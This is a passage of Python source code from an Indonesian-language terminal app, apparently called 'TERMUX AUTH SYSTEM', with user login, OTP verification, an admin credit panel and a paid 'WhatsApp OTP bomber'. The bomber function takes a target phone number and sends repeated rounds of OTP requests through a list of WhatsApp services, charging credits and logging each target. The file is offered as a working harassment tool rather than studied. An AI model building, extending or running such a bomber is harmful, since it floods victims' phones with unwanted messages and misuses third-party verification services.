                loading_tqdm("Verifikasi email", 20)
                confirmed, msg = auth.confirm_email(uid)
                if confirmed:
                    success("Email terverifikasi!")
                    info("Silakan login")
                else:
                    error(f"Gagal verifikasi: {msg}")
        else:
            error(msg)
    else:
        err_msg = res.get("error", "") if isinstance(res, dict) else str(res)
        error(err_msg)

def do_login(auth, cfg):
    section("LOGIN")
    email = get_email()
    pw = get_pass()
    print()
    loading_tqdm("Memverifikasi", 25)
    ok, res = auth.login(email, pw)
    if ok:
        success("Login berhasil!")
        return res
    else:
        err = res.get("error", "") if isinstance(res, dict) else str(res)
        if err == "UNVERIFIED":
            info("Email belum diverifikasi")
            info("Mengirim OTP untuk verifikasi...")
            loading_tqdm("Mengirim OTP", 30)
            otp = gen_otp()
            save_otp(email, otp)
            sent, msg = send_email(cfg, email, otp)
            if sent:
                success(msg)
                print()
                if otp_input(email, cfg):
                    print()
                    success("OTP Valid!")
        else:
            error(err)
    return None

def do_reset(cfg):
    section("RESET PASSWORD")
    email = get_email()
    print()
    loading_tqdm("Mengirim OTP", 30)
    otp = gen_otp()
    save_otp(email, otp)
    ok, msg = send_email(cfg, email, otp)
    if ok:
        success(msg)
        print()
        if otp_input(email, cfg):
            print()
            success("Verifikasi OK!")
            info("Hubungi admin untuk reset password")
    else:
        error(msg)

def admin_login():
    section("ADMIN LOGIN")
    tries = 3
    
    while tries > 0:
        username = input(f" {GR}[?]{R} Username : {CY}").strip()
        print(R, end="")
        password = getpass.getpass(f" {GR}[?]{R} Password : {CY}")
        print(R, end="")
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            print()
            loading_tqdm("Verifikasi admin", 25)
            success("Login admin berhasil!")
            return True
        
        tries -= 1
        error(f"Kredensial salah! Sisa {tries} percobaan")
        print()
    
    error("Terlalu banyak percobaan gagal!")
    return False

def admin_panel(auth):
    try:
        while True:
            clear()
            print()
            console.print(Panel(
                f"[bold magenta]ADMIN PANEL[/bold magenta]\n"
                f"[dim]Kelola user dan credit[/dim]",
                border_style="magenta",
                padding=(1, 2)
            ))
            print()
            
            options = [
                f"{B}  [1]  Lihat Users    -  Daftar semua user{R}",
                f"{B}  [2]  Lihat Credits  -  Daftar semua credit{R}",
                f"{B}  [3]  Tambah Credit  -  Tambah credit user{R}",
                f"{B}  [4]  Kurangi Credit -  Kurangi credit user{R}",
                f"{B}  [5]  Set Credit     -  Set credit user{R}",
                f"{B}  [6]  Reset Credit   -  Reset credit user{R}",
                f"{B}  [7]  Hapus User     -  Hapus akun user{R}",
                f"{B}  [0]  Kembali        -  Ke menu utama{R}",
            ]
            
            menu = TerminalMenu(
                menu_entries=options,
                title=f"\n{CY}{B}  Admin Menu:{R}",
                menu_cursor=" ▶ ",
                menu_cursor_style=("fg_red", "bold"),
                menu_highlight_style=("fg_yellow", "bold"),
            )
            
            sel = menu.show()
            
            if sel == 0:
                admin_list_users(auth)
            elif sel == 1:
                admin_list_credits()
            elif sel == 2:
                admin_add_credit()
            elif sel == 3:
                admin_remove_credit()
            elif sel == 4:
                admin_set_credit()
            elif sel == 5:
                admin_reset_credit()
            elif sel == 6:
                admin_delete_user(auth)
            elif sel == 7 or sel is None:
                break
            
            print()
            input(f" {D}Tekan Enter...{R}")
    except KeyboardInterrupt:
        pass

def admin_list_users(auth):
    clear()
    section("DAFTAR USER")
    loading_tqdm("Mengambil data", 20)
    ok, users = auth.list_users()
    if ok:
        if not users:
            info("Tidak ada user terdaftar")
            return
        table = Table(title="Users", show_header=True, header_style="bold cyan")
        table.add_column("No", style="cyan", width=4)
        table.add_column("Email", style="green")
        table.add_column("UID", style="dim", width=20)
        table.add_column("Verified", style="yellow", width=10)
        for i, u in enumerate(users, 1):
            verified = "Yes" if u.get("email_confirmed_at") else "No"
            table.add_row(str(i), u.get("email", ""), u.get("id", "")[:20], verified)
        console.print(table)
    else:
        error(f"Gagal: {users}")

def admin_list_credits():
    clear()
    section("DAFTAR CREDITS")
    loading_tqdm("Mengambil data", 20)
    credits = get_all_credits()
    if not credits:
        info("Tidak ada data credit")
        return
    table = Table(title="User Credits", show_header=True, header_style="bold cyan")
    table.add_column("No", style="cyan", width=4)
    table.add_column("User ID", style="green", width=25)
    table.add_column("Credit", style="yellow", width=10)
    table.add_column("Used", style="magenta", width=10)
    for i, (uid, data) in enumerate(credits.items(), 1):
        table.add_row(str(i), uid[:25], str(data.get("credit", 0)), str(data.get("used", 0)))
    console.print(table)

def admin_add_credit():
    clear()
    section("TAMBAH CREDIT")
    user_id = input(f" {GR}[?]{R} User ID : {CY}").strip()
    print(R, end="")
    if not user_id:
        error("User ID tidak boleh kosong")
        return
    try:
        amount = int(input(f" {GR}[?]{R} Jumlah  : {CY}").strip())
        print(R, end="")
        if amount <= 0:
            error("Jumlah harus positif")
            return
    except:
        error("Input tidak valid")
        return
    print()
    loading_tqdm("Menambah credit", 20)
    add_credit(user_id, amount)
    new_credit = get_user_credit(user_id)
    success(f"Credit ditambahkan! Total: {new_credit}")

def admin_remove_credit():
    clear()
    section("KURANGI CREDIT")
    user_id = input(f" {GR}[?]{R} User ID : {CY}").strip()
    print(R, end="")
    if not user_id:
        error("User ID tidak boleh kosong")
        return
    try:
        amount = int(input(f" {GR}[?]{R} Jumlah  : {CY}").strip())
        print(R, end="")
        if amount <= 0:
            error("Jumlah harus positif")
            return
    except:
        error("Input tidak valid")
        return
    print()
    loading_tqdm("Mengurangi credit", 20)
    remove_credit(user_id, amount)
    new_credit = get_user_credit(user_id)
    success(f"Credit dikurangi! Total: {new_credit}")

def admin_set_credit():
    clear()
    section("SET CREDIT")
    user_id = input(f" {GR}[?]{R} User ID : {CY}").strip()
    print(R, end="")
    if not user_id:
        error("User ID tidak boleh kosong")
        return
    try:
        amount = int(input(f" {GR}[?]{R} Jumlah  : {CY}").strip())
        print(R, end="")
        if amount < 0:
            error("Jumlah tidak boleh negatif")
            return
    except:
        error("Input tidak valid")
        return
    print()
    loading_tqdm("Mengatur credit", 20)
    set_credit(user_id, amount)
    success(f"Credit diatur ke {amount}!")

def admin_reset_credit():
    clear()
    section("RESET CREDIT")
    user_id = input(f" {GR}[?]{R} User ID : {CY}").strip()
    print(R, end="")
    if not user_id:
        error("User ID tidak boleh kosong")
        return
    print()
    loading_tqdm("Reset credit", 20)
    reset_user_credit(user_id)
    success(f"Credit direset ke {DEFAULT_CREDIT}!")

def admin_delete_user(auth):
    clear()
    section("HAPUS USER")
    warning("PERINGATAN: Ini akan menghapus user secara permanen!")
    print()
    uid = input(f" {GR}[?]{R} User UID : {CY}").strip()
    print(R, end="")
    if not uid:
        error("UID tidak boleh kosong")
        return
    confirm = input(f" {YL}[?]{R} Konfirmasi (ketik 'HAPUS') : {CY}").strip()
    print(R, end="")
    if confirm != "HAPUS":
        info("Dibatalkan")
        return
    print()
    loading_tqdm("Menghapus user", 20)
    ok, msg = auth.delete_user(uid)
    if ok:
        success(msg)
    else:
        error(msg)

def do_sms_config_with_cfg(cfg, user_id):
    global used_user_agents
    
    used_user_agents.clear()
    
    clear()
    print()
    
    current_credit = get_user_credit(user_id)
    used_count = get_user_used(user_id)
    
    if current_credit < 1:
        console.print(Panel(
            f"[bold red]CREDIT HABIS![/bold red]\n\n"
            f"[bold white]Credit Anda:[/bold white] [red]{current_credit}[/red]\n"
            f"[bold white]Total Pemakaian:[/bold white] {used_count}x\n\n"
            f"[dim]Hubungi admin untuk menambah credit.[/dim]",
            border_style="red",
            padding=(1, 2)
        ))
        return
    
    console.print(Panel(
        f"[bold cyan]WHATSAPP OTP BOMBER[/bold cyan]\n"
        f"[dim]Type: WhatsApp | Max: 4x pengiriman[/dim]\n\n"
        f"[bold yellow]💳 Credit Tersisa:[/bold yellow] [green]{current_credit}[/green] | [dim]Pemakaian: {used_count}x[/dim]",
        border_style="cyan",
        padding=(1, 2)
    ))
    
    print()
    console.print(f" [bold yellow][!][/bold yellow] Format: 8xxxxxxxxx (tanpa +62/0)")
    console.print(f" [bold yellow][!][/bold yellow] Contoh: 895325844493")
    print()
    
    phone_input = input(f" {GR}[?]{R} Nomor Target : {CY}").strip()
    print(R, end="")
    
    valid, phone_clean, msg = valid_phone(phone_input)
    if not valid:
        error(msg)
        input(f"\n {D}Tekan Enter...{R}")
        return
    
    print()
    console.print(f" [bold yellow][!][/bold yellow] Jumlah pengiriman (1-4)")
    send_count_input = input(f" {GR}[?]{R} Jumlah Send  : {CY}").strip()
    print(R, end="")
    
    try:
        send_count = int(send_count_input)
        if send_count < 1:
            send_count = 1
        elif send_count > 4:
            send_count = 4
    except:
        error("Input tidak valid, menggunakan default: 1")
        send_count = 1
    
    if current_credit < send_count:
        print()
        console.print(Panel(
            f"[bold red]CREDIT TIDAK CUKUP![/bold red]\n\n"
            f"[bold white]Credit Anda:[/bold white] [red]{current_credit}[/red]\n"
            f"[bold white]Dibutuhkan:[/bold white] [yellow]{send_count}[/yellow] (untuk {send_count}x round)\n\n"
            f"[dim]Kurangi jumlah round atau hubungi admin untuk menambah credit.[/dim]",
            border_style="red",
            padding=(1, 2)
        ))
        return
    
    total_services = len(WA_SERVICES)
    total_requests = total_services * send_count
    
    print()
    target_box = (
        f"[bold white on green]  📱 TARGET INFO  [/bold white on green]\n\n"
        f"[bold green]┃[/bold green] [bold white]📞 Target[/bold white]     [dim]::[/dim] [bold cyan]+62{phone_clean}[/bold cyan]\n"
        f"[bold green]┃[/bold green] [bold white]🔧 Layanan[/bold white]    [dim]::[/dim] [bold yellow]{total_services}[/bold yellow] WhatsApp Services\n"
        f"[bold green]┃[/bold green] [bold white]🔄 Pengiriman[/bold white] [dim]::[/dim] [bold magenta]{send_count}x[/bold magenta] round\n"
        f"[bold green]┃[/bold green] [bold white]📊 Total[/bold white]      [dim]::[/dim] [bold blue]{total_requests}[/bold blue] request\n"
        f"[bold green]╰[/bold green][dim]─────────────────────────────────[/dim]\n"
        f"[bold yellow]💳[/bold yellow] [bold red]{send_count}[/bold red] credit akan digunakan"
    )
    console.print(Panel(
        target_box,
        border_style="green",
        padding=(1, 2),
        title="[bold green]★ KONFIRMASI ★[/bold green]",
        subtitle="[dim]WhatsApp OTP Sender[/dim]"
    ))
    print()
    
    service_header = Table(show_header=True, header_style="bold cyan", box=None)
    service_header.add_column("No", style="cyan", width=4)
    service_header.add_column("Nama Layanan", style="white")
    service_header.add_column("Status", style="green", width=10)
    for idx, (name, _) in enumerate(WA_SERVICES, 1):
        service_header.add_row(f"{idx}.", name, "✓ Ready")
    console.print(Panel(service_header, title="[bold white]📋 DAFTAR LAYANAN[/bold white]", border_style="cyan"))
    print()
    
    options = [
        f"{B}Mulai Kirim - Kirim ke semua layanan ({send_count} credit){R}",
        f"{B}← Batal{R}",
    ]
    
    menu = TerminalMenu(
        menu_entries=options,
        title=f"\n{GR}Pilih Aksi:{R}",
        menu_cursor="▶ ",
        menu_cursor_style=("fg_red",),
        menu_highlight_style=("fg_yellow", "bold"),
    )
    
    sel = menu.show()
    
    if sel is None or sel == 1:
        info("Dibatalkan")
        return
    
    if not use_credit(user_id, send_count):
        print()
        error("Gagal mengurangi credit! Credit tidak cukup.")
        return
    
    new_credit = get_user_credit(user_id)
    print()
    console.print(Panel(
        f"[bold yellow]💳 {send_count} Credit digunakan[/bold yellow]\n"
        f"[bold white]Credit Tersisa:[/bold white] [green]{new_credit}[/green]",
        border_style="yellow",
        padding=(0, 2)
    ))
    time.sleep(1)
    
    clear()
    print()
    
    console.print(Panel(
        f"[bold white]MENGIRIM OTP VIA WHATSAPP[/bold white]\n"
        f"[dim]Target: +62{phone_clean} | {send_count}x Send | Tekan CTRL+C untuk stop[/dim]",
        border_style="magenta",
        padding=(0, 2)
    ))
    print()
    
    success_count = 0
    fail_count = 0
    results = []
    
    try:
        for round_num in range(1, send_count + 1):
            console.print(f"\n [bold white]═══════════════════════════════════════[/bold white]")
            console.print(f" [bold cyan]  ROUND {round_num}/{send_count}[/bold cyan]")
            console.print(f" [bold white]═══════════════════════════════════════[/bold white]\n")
            
            for i, (name, func) in enumerate(WA_SERVICES):
                request_num = (round_num - 1) * total_services + i + 1
                
                console.print(f" [cyan]┌─────────────────────────────────────┐[/cyan]")
                console.print(f" [cyan]│[/cyan] [bold white]Layanan:[/bold white] {name:<27}[cyan]│[/cyan]")
                console.print(f" [cyan]│[/cyan] [bold white]Request:[/bold white] {request_num}/{total_requests:<24} [cyan]│[/cyan]")
                console.print(f" [cyan]└─────────────────────────────────────┘[/cyan]")
                
                print(f"  ", end="")
                ok = False
                result_msg = ""
                for step in tqdm(range(20), desc="Mengirim", colour="cyan",
                                 bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}",
                                 ncols=45, leave=False):
                    if step == 10:
                        ok, result_msg = func(phone_clean)
                    time.sleep(0.05)
                
                if ok:
                    success_count += 1
                    console.print(f"   [bold green]✓[/bold green] Status: [green]BERHASIL[/green]")
                    play_send_success_sound()
                    save_otp_log(user_id, phone_clean, "success", name)
                else:
                    fail_count += 1
                    console.print(f"   [bold red]✗[/bold red] Status: [red]GAGAL[/red] - {result_msg[:25]}")
                    play_send_fail_sound()
                    save_otp_log(user_id, phone_clean, "failed", name)
                
                results.append((str(request_num), f"R{round_num}-{name}", "[green]OK[/green]" if ok else "[red]GAGAL[/red]", "Terkirim" if ok else result_msg[:15]))
                print()
            
            if round_num < send_count:
                print()
                console.print(Panel(
                    f"[bold yellow]DELAY 60 DETIK[/bold yellow]\n"
                    f"[dim]Sebelum round berikutnya...[/dim]",
                    border_style="yellow",
                    padding=(0, 2)
                ))
                print()
                
                for sec in tqdm(range(60), desc="  Menunggu", colour="yellow",
                                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} detik",
                                ncols=50):
                    time.sleep(1)
                print()
        
        print()
        console.print(Panel(
            f"[bold white]════════════ HASIL PENGIRIMAN ════════════[/bold white]",
            border_style="cyan",
            padding=(0, 2)
        ))
        print()
        
        result_table = Table(show_header=True, header_style="bold cyan", box=None)
        result_table.add_column("No", style="dim", width=4)
        result_table.add_column("Layanan", width=18)
        result_table.add_column("Status", width=12)
        result_table.add_column("Keterangan", width=20)
        
        for row in results:
            result_table.add_row(*row)
        
        console.print(result_table)
        
        print()
        console.print(Panel(
            f"[bold green]✓ Berhasil[/bold green]: {success_count}/{total_requests}\n"
            f"[bold red]✗ Gagal[/bold red]: {fail_count}/{total_requests}\n"
            f"[bold cyan]➤ Total Round[/bold cyan]: {send_count}",
            border_style="green" if success_count > fail_count else "red",
            padding=(0, 2)
        ))
        
        update_target_rounds(user_id, phone_clean, send_count)
        
    except KeyboardInterrupt:
        print()
        print()
        info("Proses dihentikan oleh user (CTRL+C)")
        print()
        
        if results:
            result_table = Table(show_header=True, header_style="bold cyan", box=None)
            result_table.add_column("No", style="dim", width=4)
            result_table.add_column("Layanan", width=18)
            result_table.add_column("Status", width=12)
            result_table.add_column("Keterangan", width=20)
            
            for row in results:
                result_table.add_row(*row)
            
            console.print(result_table)
        
        print()
        console.print(Panel(
            f"[bold yellow]TERHENTI[/bold yellow]\n"
            f"[bold green]✓ Berhasil[/bold green]: {success_count}\n"
            f"[bold red]✗ Gagal[/bold red]: {fail_count}\n"
            f"[dim]Terkirim: {success_count + fail_count}/{total_requests}[/dim]",
            border_style="yellow",
            padding=(0, 2)
        ))


def user_menu(auth, cfg, user_data):
    user_id = user_data.get("uid", "")
    user_email = user_data.get("email", "")
    
    try:
        while True:
            clear()
            print()
            
            credit = get_user_credit(user_id)
            used = get_user_used(user_id)
            
            header = (
                f"[bold green]{get_greeting()}![/bold green]\n"
                f"[bold white]Email:[/bold white] {user_email}\n"
                f"[bold yellow]Credit:[/bold yellow] {credit} | [dim]Pemakaian: {used}x[/dim]"
            )
            console.print(Panel(header, border_style="green", padding=(1, 2)))
            
            print_info_table(get_device_info(), get_ip())
            
            title_box = f"\n{GR}{B}  Menu Utama:{R}"
            
            menu_options = [
                f"{B}  [1]  WA Bomber   -  Kirim OTP via WhatsApp{R}",
                f"{B}  [2]  Developer   -  Info Developer{R}",
                f"{B}  [0]  Logout      -  Keluar akun{R}",
            ]
            
            main_menu = TerminalMenu(
                menu_entries=menu_options,
                title=title_box,
                menu_cursor=" ▶ ",
                menu_cursor_style=("fg_green", "bold"),
                menu_highlight_style=("fg_cyan", "bold"),
            )
            
            sel = main_menu.show()
            
            if sel == 0:
                do_sms_config_with_cfg(cfg, user_id)
                print()
                input(f" {D}Tekan Enter...{R}")
            elif sel == 1:
                show_developer_info()
            elif sel == 2 or sel is None:
                info("Logout...")
                break
    except KeyboardInterrupt:
        show_interrupt_message()
        raise SystemExit(0)


def main_menu(auth, cfg):
    BANNER = f"""{CY}
╭────────────────────────────────────────────────────────────╮
│                                                            │
│     {GR}████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗{CY}  │
│     {GR}╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝{CY}  │
│        {GR}██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝{CY}   │
│        {GR}██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗{CY}   │
│        {GR}██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗{CY}  │
│        {GR}╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝{CY}  │
│                                                            │
│            {B}{MG}A U T H   S Y S T E M{R}{CY}                           │
│              {D}by XyraOfficial{R}{CY}                               │
│                                                            │
╰────────────────────────────────────────────────────────────╯{R}
"""
    
    try:
        while True:
            clear()
            print(BANNER)
            print_info_table(get_device_info(), get_ip())
            
            title_box = f"\n{CY}{B}  Pilih Menu:{R}"
            
            options = [
                f"{B}  [1]  Login     -  Masuk ke akun{R}",
                f"{B}  [2]  Signup    -  Daftar akun baru{R}",
                f"{B}  [3]  Reset     -  Lupa password{R}",
                f"{B}  [4]  Admin     -  Panel Admin{R}",
                f"{B}  [5]  Developer -  Info Developer{R}",
                f"{B}  [0]  Exit      -  Keluar{R}",
            ]
            
            menu = TerminalMenu(
                menu_entries=options,
                title=title_box,
                menu_cursor=" ▶ ",
                menu_cursor_style=("fg_cyan", "bold"),
                menu_highlight_style=("fg_green", "bold"),
            )
            
            sel = menu.show()
            
            if sel == 0:
                user_data = do_login(auth, cfg)
                if user_data:
                    user_menu(auth, cfg, user_data)
            elif sel == 1:
                do_signup(auth, cfg)
            elif sel == 2:
                do_reset(cfg)
            elif sel == 3:
                if admin_login():
                    admin_panel(auth)
            elif sel == 4:
                show_developer_info()
            elif sel == 5 or sel is None:
                show_interrupt_message()
                break
            
            print()
            input(f" {D}Tekan Enter...{R}")
    except KeyboardInterrupt:
        show_interrupt_message()
        raise SystemExit(0)


def run_main():
    """Main entry point"""
    cfg = load_config()
    if cfg is None:
        print()
        error("Tidak dapat memuat konfigurasi!")
        print()
        return
    
    supabase_url = cfg.get("supabase_url", "")
    supabase_key = cfg.get("supabase_anon_key", "")
    supabase_svc = cfg.get("supabase_service_key", "")
    
    if supabase_url and supabase_svc:
        init_supabase_credit(supabase_url, supabase_svc)
    
    auth = Auth(supabase_url, supabase_key, supabase_svc)
    
    play_startup_sound()
    main_menu(auth, cfg)


if __name__ == "__main__":
    run_main()
